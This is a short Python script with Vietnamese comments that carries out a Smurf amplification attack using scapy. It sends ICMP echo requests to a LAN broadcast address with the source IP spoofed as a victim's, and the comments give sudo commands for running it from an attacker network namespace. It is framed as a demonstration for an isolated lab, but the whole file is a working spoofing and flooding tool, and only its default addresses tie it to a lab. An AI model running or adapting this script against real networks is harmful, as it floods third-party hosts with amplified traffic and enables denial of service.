#!/usr/bin/env python3
# smurf.py - Minh hoa co che khuech dai Smurf TRONG PHONG LAB CO LAP.
#
# Gui ICMP echo request toi dia chi BROADCAST cua LAN, voi dia chi nguon
# bi GIA MAO = IP nan nhan. Nhung host co bat tra loi ping broadcast se doi
# echo-reply ve nan nhan => 1 goi gui di sinh ra N goi doi ve (amplification).
#
# CHAY TRONG namespace attacker (can root):
#   sudo ip netns exec atk python3 smurf.py
#   sudo ip netns exec atk python3 smurf.py --count 20
#
# Chi su dung trong moi truong lab namespace co lap tren chinh may cua ban.
import argparse
from scapy.all import IP, ICMP, send


def main():
    ap = argparse.ArgumentParser(description="Smurf amplification demo (lab-only)")
    ap.add_argument("--victim", default="10.0.0.200",
                    help="IP nan nhan - dung lam dia chi nguon GIA MAO")
    ap.add_argument("--broadcast", default="10.0.0.255",
                    help="Dia chi broadcast cua LAN")
    ap.add_argument("--count", type=int, default=10,
                    help="So goi echo request gui di")
    args = ap.parse_args()

    # src = nan nhan (gia mao) -> moi echo-reply se doi ve nan nhan, khong ve attacker
    pkt = IP(src=args.victim, dst=args.broadcast) / ICMP()
    send(pkt, count=args.count, verbose=0)

    print(f"[+] Da gui {args.count} goi ICMP echo -> {args.broadcast} "
          f"(nguon gia mao = {args.victim})")
    print("[i] Xem terminal nan nhan: moi goi broadcast sinh nhieu echo-reply doi ve.")


if __name__ == "__main__":
    main()
